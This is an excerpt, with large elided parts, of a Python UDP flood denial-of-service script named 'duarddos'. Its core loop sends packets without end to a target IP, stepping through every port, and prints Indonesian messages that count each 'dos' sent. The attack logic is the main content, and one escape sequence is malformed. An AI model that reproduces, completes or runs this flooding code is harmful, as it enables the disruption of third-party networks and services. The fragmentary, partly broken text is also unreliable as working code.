...
while True:
    ...
    if opt == '1':
        ...
        print("duarddos Tool is an open source tool for              \033[92m;\033[0m d \033[91m|_| \\ \\\033[0m \033[93m<|\033[0m  a \033[92m;\033[0m")
...
if port_mode == False:  # All ports.
    try:
        while True:
            ...
            sent += 1
            port += 1
            print("\033[32;1mberhasil mengirim %s dosaa ke %s target 💐🌷🌹🌸🌺 port:%s"%(sent, ip, port))
    except:
    ...
    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\03332;[32;1mberhasil mengirim %s dosaa ke %s target 💐🌷🌹🌸🌺 port:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')
